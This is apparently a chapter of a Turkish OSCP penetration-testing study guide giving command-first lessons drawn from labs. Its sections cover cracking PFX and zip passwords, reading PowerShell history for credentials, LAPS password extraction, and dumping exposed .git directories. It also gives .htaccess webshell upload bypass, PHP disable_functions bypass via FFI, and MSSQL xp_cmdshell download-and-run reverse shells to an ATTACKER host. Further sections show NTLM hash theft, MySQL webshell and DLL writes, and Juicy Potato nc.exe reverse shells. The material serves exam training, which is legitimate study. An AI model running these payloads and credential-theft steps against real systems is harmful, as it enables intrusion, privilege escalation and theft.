---
layout: page
title: "Bölüm 10 — Sahadan Vaka Dersleri"
oscp: true
toc: true
permalink: /oscp/10-vakalar/
---

{% raw %}
Bu bölüm, gerçek lab senaryolarından (AD ve standalone, Windows ve Linux)
**genelleştirilmiş** derslerdir. Makine adı, flag ve kırılmış parola yoktur;
her kalıp doğrudan başka hedefe taşınabilir formdadır. Amacı: "bu teknik ne zaman
işe yarar, hangi komutla, hangi tuzakla karşılaşılır" sorusuna komut-öncelikli,
kısa cevap vermek. Detay teorisi için bkz. [Bölüm 7](/oscp/07-ad-saldirilari/),
[Bölüm 4-5](/oscp/04-windows-privesc/) ve [Bölüm 9](/oscp/09-istemci-av/).

## Windows Initial Access & Credential Dersleri

### PFX / sertifika dosyasından client-auth credential çıkarma (evil-winrm -k)
**Ne / ne zaman:** Paylaşımda, arşivde veya backup dizininde `.pfx` (PKCS#12)
dosyası bulduğunda. PFX hem sertifika hem private key taşır; parolası kırılırsa
hedef makineye **sertifika ile** (parolasız) WinRM/SSL oturumu açılabilir.
Bu, "parola yok ama key var" initial-access senaryosudur.

```bash
# 1) Arşiv ve PFX parolasını kır
unzip backup.zip                       # parolalıysa:
zip2john backup.zip > zip.hash && john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash

pfx2john cert.pfx > pfx.hash
john --wordlist=/usr/share/wordlists/rockyou.txt pfx.hash

# 2) Key + sertifikayı ayır (çıktıdaki parola = john sonucu)
openssl pkcs12 -in cert.pfx -nocerts -nodes -out priv_dec.key
openssl pkcs12 -in cert.pfx -clcerts -nokeys -out cert.crt

# 3) Sertifika ile WinRM (parola yerine key)
evil-winrm -i TARGET -S -c cert.crt -k priv_dec.key
```

**Tuzaklar / notlar:**
- `evil-winrm -k` kullanırken `-S` (SSL) şart; 5986 portuna gider.
- `openssl pkcs12` derlenmiş key vermezse `priv_dec.key`yi `evil-winrm -k`ya
  vermek yeterlidir; ayrıca RSA formatına çevirmek gerekebilir.
- PFX parolası zayıf değilse önce `john` kurallı mod (`--rules`) dene; PKZIP/PKCS12
  formatı john'da varsayılan doğru ayrışır (`pfx2john` çıktısının başında format adı yazar).
- Backup arşivleri (winrm.backup, ssl backup, IIS export) her zaman ilk hedef;
  SMB paylaşım taramasında `*.pfx`, `*.zip`, `*.key` için spider yap.

### PSReadLine console history'den parola bulma
**Ne / ne zaman:** Herhangi bir Windows kullanıcısıyla oturum aldığında. Sistem
yöneticileri ve servis hesapları sık sık parolayı PowerShell komut satırında
düz metin yazar (`-Password`, `-Credential`, `ConvertTo-SecureString` gibi).
History dosyası bunların tamamını saklar.

```powershell
# Her kullanıcı için:
type C:\Users\<KULLANICI>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Gizli dizinler dahil hızlı tarama:
gci -force C:\Users\<KULLANICI>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\
```

**Tuzaklar / notlar:**
- History'de parola bulunca **ikinci bir hesaba** geçiş yap: o hesabın kendi
  history'si zinciri uzatır (credential chaining).
- `cmd.exe` kullanıcılarında `doskey /history` benzeri iz yoktur; ama
  unattended XML'leri (`C:\Windows\Panther\unattend.xml`), `web.config` ve
  servis scriptleri aynı aramaya dahildir.
- Hedef kullanıcı başka makinede de oturum açıyorsa, history orada da aynıdır —
  LAPS veya gMSA parolası bulunabilir.

### LAPS abuse kalıbı (ReadLAPSPassword yetkisi)
**Ne / ne zaman:** Kullanıcının yetki grubunda **LAPS_Readers** (veya eski
`All Extended Rights`) olduğunu gördüğünde. AD'ye kayıtlı her bilgisayarın local
Administrator parolası `ms-Mcs-AdmPwd` attribute'unda tutulur; okuma yetkisi =
**domaindeki tüm makinelerin local admin'i** demektir. Yetki sende değil,
okuduğun objededir — attribute'u göremeyen için değer boş görünür.

```bash
# 1) Yetki var mı: kendi gruplarını kontrol et
net user <KULLANICI> /domain    # veya: whoami /groups

# 2) LAPS parolasını çek — netexec en pratiği
nxc ldap TARGET -u <KULLANICI> -p '<PAROLA>' --laps
nxc smb  TARGET -u <KULLANICI> -p '<PAROLA>' --laps

# 3) Ham LDAP sorgusu
ldapsearch -x -H ldap://TARGET \
  -D '<KULLANICI>@<DOMAIN>' -w '<PAROLA>' \
  -b 'DC=<DOMAIN>,DC=lab' '(ms-MCS-AdmPwd=*)' ms-MCS-AdmPwd sAMAccountName

# 4) Alternatif: pyLAPS
python3 pyLAPS.py --action get -d "<DOMAIN>" -u "<KULLANICI>" -p "<PAROLA>" --dc-ip TARGET

# 5) Çekilen local admin ile bağlan
nxc smb TARGET -u 'Administrator' -p '<LAPS_PAROLASI>'
```

**Tuzaklar / notlar:**
- LAPS v2'de attribute `msLaps-Password` olur; sorguyu buna göre uyarla.
- Parola periyodik rotate edilir — çektikten sonra geç kalma.
- `GenericAll`/`Write` yetkin varsa hedef bilgisayar objesine kendini
  LAPS_Readers'a ekleyip sonra okuyabilirsin (bkz. [Bölüm 7](/oscp/07-ad-saldirilari/)).

## Web: Kaynak Sızıntısı & Upload Bypass

### Açıkta .git dizini → git-dumper ile kaynak kurtarma
**Ne / ne zaman:** Web kökünde veya alt dizinde (`/dev/.git/HEAD` 200 dönüyorsa)
açık `.git` bulduğunda. Tüm kaynak kod, config, eski commit'ler ve history'de
unutulmuş secret'lar geri kazanılır.

```bash
# 1) Dump et (hangover'ın git_dumper.py'si)
python3 /opt/git-dumper/git_dumper.py http://TARGET/.git/ git-out
cd git-out

# 2) Durum ve commit inceleme
git status
git log --oneline --all
git show <commit_id>
git diff <eski_commit> <yeni_commit>

# 3) Secret taraması — history dahil
gitleaks detect --source=.
git log -p | grep -iE "password|secret|apikey|token"
```

**Tuzaklar / notlar:**
- Sadece `git log` yetmez; secret'lar çoğunlukla **silinmiş** commit'lerde ve
  eski dosya sürümlerindedir. `git log --all -p` şart.
- `.git` dizini 403 ama `HEAD` erişilebilir olabilir; dirsearch/ffuf ile
  `.git/HEAD`, `.git/config`, `.git/index` doğrulanmalı.
- Config'de `remote origin` gördüğünde iç ağ host adı öğrenilir — vhost/DNS
  ipucu olarak kullan (bkz. [Bölüm 2](/oscp/02-web-saldirilari/)).
- GUI ile analiz için SourceTree benzeri bir araca dizini verip diff'leri
  elle gezmek hızlıdır.

### .htaccess AddType ile webshell upload bypass
**Ne / ne zaman:** Upload noktası sadece uzantı blacklist'i yapıyorsa (`.php`
engelliyor ama `.htaccess` yüklenebiliyorsa). Apache, `.htaccess` içindeki
`AddType` ile herhangi bir uzantıyı PHP handler'a bağlar — arbitray uzantılı
dosya çalışır.

```bash
# 1) Upload edilecek .htaccess (arbitray uzantıyı PHP olarak çalıştır)
echo "AddType application/x-httpd-php .dum4n" > .htaccess
# (üretim dışı başka seçenek: SetHandler application/x-httpd-php)

# 2) Aynı uzantıda webshell yükle
curl -F "file=@shell.dum4n" http://TARGET/upload.php

# 3) Çalıştır
curl "http://TARGET/uploads/shell.dum4n?cmd=whoami"
```

```php
<?php system($_GET['cmd']); ?>
```

**Tuzaklar / notlar:**
- Apache 2.4+ bazı kurulumlarda `.htaccess` `AllowOverride None` ile ölüdür;
  önce küçük bir `.htaccess` ile test et (500 dönüyorsa override kapalıdır).
- `php` kelimesi blacklist'teyse `.phtml`, `.php5`, `.phar`, `.pht` dene.
- Upload sonrası dosya yolu verilmiyorsa dirsearch/ffuf ile `/uploads/`,
  `/files/`, `/upload/` keşfet (bkz. [Bölüm 2](/oscp/02-web-saldirilari/)).
- Bypass listesi için ayrıca `Content-Type` spoofing ve çift uzantı
  (`shell.php.jpg`) dene.

### PHP disable_functions bypass yaklaşımı
**Ne / ne zaman:** Webshell açıldı ama `system()`, `exec()`, `shell_exec()`
`disable_functions` ile kapalıysa. Hedef: PHP sürecinin kendisini ya da yan
kanalları kullanarak komut çalıştırmak.

```bash
# 1) phpinfo() veya benzeriyle aktif disable_functions + yüklü modülleri öğren
curl "http://TARGET/shell.php?cmd=phpinfo();" | grep -i disable_functions

# 2) LD_PRELOAD yolu mümkün mü? (dfunc-bypasser mevcut bypass'ı doğrular)
python3 dfunc-bypasser.py --url http://TARGET/phpinfo.php
#  veya lokal phpinfo çıktısıyla:
python3 dfunc-bypasser.py --file phpinfo.html
```

```php
<?php
// Yol A: LD_PRELOAD + putenv + mail() (dfunc-bypasser uygun payload üretir)
// Yol B: FFI (PHP 7.4+, ffi.enable=preload içeriyorsa)
$ffi = FFI::cdef("int system(const char *command);", "libc.so.6");
$ffi->system($_GET['cmd']);
// Yol C: Imagick/GMP/PCNTL gibi modül zafiyetleri (CVE-2016-3714 vb.)
// Yol D: PHP-FPM soketine UDS üzerinden doğrudan istek
?>
```

**Tuzaklar / notlar:**
- phpinfo bulunamazsa `<?php echo ini_get('disable_functions'); ?>` yeterlidir.
- LD_PRELOAD bypass'ı yalnızca `putenv`/`mail` açıkken ve Linux hedefte çalışır.
- Windows hedefte `COM` objeleri, `wmi` veya `dotnet` yükleme yolları dene.
- Bypass başarısızsa hedefi yeniden değerlendir: upload RCE yerine dosya
  okuma (`php://filter`) ile config/secret çıkarmak da kazandırır (bkz.
  [Bölüm 2](/oscp/02-web-saldirilari/)).

## Veritabanından Komut Çalıştırma

### MSSQL xp_cmdshell kalıbı
**Ne / ne zaman:** MSSQL'e düşük yetkili hesapla bağlandığında — özellikle
SQL injection üzerinden de tetiklenebilir. `xp_cmdshell` kapalıysa açılır,
`IMPERSONATE` yetkisi varsa sa kullanıcısına yükselir.

```bash
# Bağlan
impacket-mssqlclient <KULLANICI>@TARGET -windows-auth
sqsh -S TARGET -U <KULLANICI> -P '<PAROLA>' -h
nxc mssql TARGET -u <KULLANICI> -p '<PAROLA>' -q 'SELECT name FROM master.dbo.sysdatabases;'
```

```sql
-- 1) xp_cmdshell aç
EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- 2) Tespit için gecikmeli sorgu (blind'ta ping)
EXEC xp_cmdshell 'ping -n 5 127.0.0.1';

-- 3) Reverse shell (PowerShell indir-çalıştır)
EXEC xp_cmdshell 'powershell -c "IEX(IWR http://ATTACKER:8181/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell ATTACKER 4455"';

-- 4) IMPERSONATE kontrolü (sa'ya yükseltme kapısı)
SELECT distinct b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- 5) NTLM hash çaldırma (kendi SMB sunucuna)
EXEC master..xp_dirtree '\\ATTACKER\share\';
```

```bash
# netexec ile tek komut + dosya transferi
nxc mssql TARGET -u <KULLANICI> -p '<PAROLA>' -x 'whoami'
nxc mssql TARGET -u <KULLANICI> -p '<PAROLA>' --put-file ./shell.exe C:\\Windows\\Temp\\shell.exe

# msdat: tarama + passwordstealer + oleautomation ile dosya okuma/yazma
python3 /opt/msdat/msdat.py all -s TARGET -D <DOMAIN> -U <KULLANICI> -P '<PAROLA>'
python3 /opt/msdat/msdat.py oleautomation -s TARGET -U <KULLANICI> -P '<PAROLA>' --read-file 'C:\Users\Administrator\Desktop\flag.txt'
```

**Tuzaklar / notlar:**
- SQL injection içinden: `1'; EXEC sp_configure ...; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE-- -`
- `xp_cmdshell` açılamıyorsa `sp_OACreate`/`OLE Automation` yoluyla
  `WScript.Shell` kullan (msdat `oleautomation` modülü hazır).
- Injection'ın blind olduğunu doğrulamak için zaman gecikmesi (ping) kullan;
  hata mesajı kapatılmışsa bile çalışır.
- Hash çaldırma için `xp_dirtree` UNC yolu `responder`/`smbserver` ile eşleşir
  (bkz. [Bölüm 3](/oscp/03-parola-saldirilari/)).

### MySQL INTO OUTFILE / INTO DUMPFILE
**Ne / ne zaman:** MySQL'e root/yazma yetkili hesapla bağlandığında. Dosya
yazarak webshell bırakmak veya DLL yazarak privesc tetiklemek için kullanılır.

```sql
-- 1) Yazma kısıtını kontrol et
SHOW VARIABLES LIKE 'secure_file_priv';   -- boş = her yere yazılır, /tmp ise sınırlı

-- 2) Webshell yaz (Linux / Windows)
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/tmp/shell.php';
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE 'C:/Windows/Temp/shell.php';

-- 3) Binary yazmak için DUMPFILE (tek satır, escape'siz)
SELECT load_file('C:\\Tools\\shell.dll') INTO DUMPFILE 'C:\\Windows\\System32\\wbem\\tzres.dll';

-- 4) Dosya okuma
SELECT LOAD_FILE('/etc/passwd');

-- 5) DB hash'leri kırılamıyorsa parolayı değiştir ve panele gir
UPDATE users SET password='<HASH>' WHERE username='admin';
```

**Tuzaklar / notlar:**
- `INTO OUTFILE` sonunda satır sonu ekler; binary için `INTO DUMPFILE` kullan.
- `secure_file_priv` doluysa o dizine yaz; web root'un altında değilse
  log poisoning veya mevcut upload dizinini bul.
- Windows'ta MySQL genelde SYSTEM çalışır — DLL hijacking ile doğrudan SYSTEM
  shell alınabilir. Tetikleyici: `systeminfo` (tzres.dll) veya print spooler
  CLSID instantiation.
- `FILE` yetkisi olmayan kullanıcıda bu yollar kapalıdır; yetki kontrolü için
  `SHOW GRANTS;`.

## Privesc: Servis Hesabı Suistimali

### Juicy Potato (SeImpersonate) senaryosu
**Ne / ne zaman:** Windows servis hesabı (IIS pool, MSSQL servisi vb.) ile
oturumdaysan ve `whoami /priv` çıktısında `SeImpersonatePrivilege` aktifse.
Windows 2016 öncesi için klasik, sonrasında PrintSpoofer/SweetPotato önerilir.

```powershell
# 1) Yetkiyi doğrula
whoami /priv    # SeImpersonatePrivilege = Enabled
```

```bash
# 2) CLSID bul (OS versiyonuna göre değişir)
# https://ohpe.it/juicy-potato/CLSID/
```

```powershell
# 3) Juicy Potato çalıştır (32/64 bit hedefe göre jp32/jp64)
.\jp64.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\windows\temp\nc.exe ATTACKER 7777 -e cmd.exe" -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
```

```bash
# Modern alternatifler (Server 2019+ / hardened):
# PrintSpoofer
PrintSpoofer.exe -i -c cmd
# SweetPotato
SweetPotato.exe -p c:\windows\temp\nc.exe -a "ATTACKER 7777 -e cmd"
```

**Tuzaklar / notlar:**
- CLSID yanlışsa exploit sessizce çalışmaz; CLSID listesini hedef OS build'ine
  göre seç.
- 64-bit hedefte 64-bit binary kullan; wow64 çakışması yaygın hatadır.
- Parolasını bildiğin başka bir hesapla komut çalıştırman gerekirse
  `runas` interaktif değilse `Invoke-RunAsCs` kullan:
  `Invoke-RunAsCs -Username <KULLANICI> -Password <PAROLA> -Command "..."`
- Servis hesabı değil de backup operatörü gibi hesapdaysan `SeBackupPrivilege`
  yolunu düşün (bkz. [Bölüm 4](/oscp/04-windows-privesc/)).

## Post-Exploitation: Kod İz Sürmesi

### Git forensics (gitleaks)
**Ne / ne zaman:** Kaynak koda erişildiğinde (dump edilmiş `.git`, sızan repo,
elde edilen arşiv). Commit history'de unutulmuş API key, parola, token ve
internal host bilgisi bulmak için otomatik tarama.

```bash
# Repo üzerinde tarama (çalışma dizininde)
gitleaks detect --source=. -v

# Sadece commit history'sini tara
gitleaks git --log-opts="--all" .

# Belirli bir dizinde rapor üret
gitleaks detect --source=./git-out --report-path=gitleaks-report.json

# Manuel hızlı tarama (gitleaks yoksa)
git log -p --all | grep -iE "password|secret|api[_-]?key|token|BEGIN.*PRIVATE KEY"
git secrets --scan  # AWS için alternatif
```

**Tuzaklar / notlar:**
- Bulunan credential **hemen test edilmeli** ama public repoda yayınlanmamalı;
  lab notlarında placeholder'a çevir.
- Secret silinmiş commit'lerde de kalır; `gitleaks detect` history'yi tarar ama
  `git show <eski_commit>:<dosya>` ile doğrulamak kanıt olarak yeterlidir.
- Internal subdomain, DB connection string ve hardcoded test hesapları da
  taramanın değerli çıktılarıdır — recon'a geri besle.
- OffSec/HTB lab'larında bulunan credential'ı genelleştirilmiş forma çevir
  (bkz. sanitizasyon kuralı); makine-spesifik cevap yayınlanmaz.

## Genel: Çözüm Yaklaşımı Metodolojisi

### Sahadan öğrenilen genel taktikler
**Ne:** Aşağıdakiler tek tek teknik değil, çok sayıda senaryoda tekrar eden
**davranış kalıplarıdır**. Sıkıştığında bu kontrol listesine dön.

```text
STUCK-CHECKLIST
┌─ Keşif yeterli mi?
│  • UDP taraması atlandı mı? (goudpscan / nmap -sU -F)
│  • vhost brute force yapıldı mı? (ffuf -H "Host: FUZZ.TARGET")
│  • web dizin taramasında recursive + extension fuzz yapıldı mı?
│  • servis banner'ındaki ürün adı searchsploit'te arandı mı?
│  • aynı ürün adı kullanıcı adı/hesap adı ipucu verebilir!
├─ Credential zinciri kopuk mu?
│  • Her yeni hesabın PSReadLine history'si okundu mu?
│  • Paylaşımlarda arşiv (.zip/.pfx/.bak) spider ile indirildi mi?
│  • zip2john/pfx2john ile kırılabilir mi?
│  • yetki gruplarında LAPS/GenericAll/DCSync ipucu var mı?
├─ Engel tek katmanlı mı?
│  • Upload engelliyor → .htaccess AddType, çift uzantı, MIME spoof
│  • disable_functions → LD_PRELOAD/FFI/modül CVE
│  • xp_cmdshell kapalı → sp_OACreate / oleautomation / impersonate
│  • parola bilmiyorum → runas yerine Invoke-RunAsCs, hash pass-the-hash
├─ Sızıntı kaynağı görünürde mi?
│  • .git açık mı? (git-dumper + gitleaks)
│  • error page / stack trace ürün + sürüm veriyor mu?
│  • robots.txt, backup dosyaları (.bak, ~, .old), .htpasswd
└─ Sağlamlaştırma eksik mi?
   • SeImpersonate → Juicy/PrintSpoofer, SeManageVolume → exploit
   • sudo -l, SUID, capabilities, cron, NFS no_root_squash
   • mysql FILE yetkisi → webshell/DLL hijack
```

```bash
# Çok kullanılan hızlı doğrulamalar
sudo nxc smb TARGET -u "" -p "" --shares          # anonim paylaşım
nmap -sV --script=http-webdav-generator TARGET    # WebDAV var mı
curl -s http://TARGET/.git/HEAD                   # açık git mi
cat /etc/exports 2>/dev/null                      # NFS no_root_squash
```

**Tekrar eden dersler (özet):**
- **Parola = parola değil.** Sertifika, key, history, arşiv, gMSA, LAPS —
  her katmanda başka bir credential türü olabilir.
- **Yetki okumaktan ibaret olabilir.** LAPS attribute'u gibi, yetki objenin
  kendisinde saklanır; grubuna bak.
- **Blacklist hep aşılır.** Uzantı blacklist'i, disable_functions, port
  kapatma — tek katmanlı her savunma bir bypass üretir.
- **Silinmiş ≠ gitmemiş.** `.git` history'si, PSReadLine history'si, MySQL
  logları, crash dump'lar silinmiş veriyi geri verir.
- **Blind'ta zamanlama kanıttır.** SQL injection'da ping gecikmesi, SSRF'te
  internal port taraması gibi dolaylı sinyal kullan.
- **Standart olmayan portları atma.** UDP, yüksek TCP portlar, internal
  servisler — OSCP'ta asıl kapı çoğu zaman oradadır.
- **Her yeni erişimle enum döngüsü yeniden başlar.** Hesap değişince şu
  dört soru: yeni paylaşım? yeni history? yeni yetki? yeni servis erişimi?

**Kaynaklar:**
- HackTricks — Active Directory: https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html
- HackTricks — File Upload: https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html
- HackTricks — SQL Injection / MSSQL: https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html
- ohpe — Juicy Potato CLSID listesi: https://ohpe.it/juicy-potato/CLSID/
- dfunc-bypasser (LD_PRELOAD bypass doğrulama): https://github.com/teambi0s/dfunc-bypasser
- gitleaks: https://github.com/gitleaks/gitleaks
{% endraw %}


[← Bölüm 9](/oscp/09-istemci-av/) · [Bölüm 11 →](/oscp/11-servis-enumerasyon/)
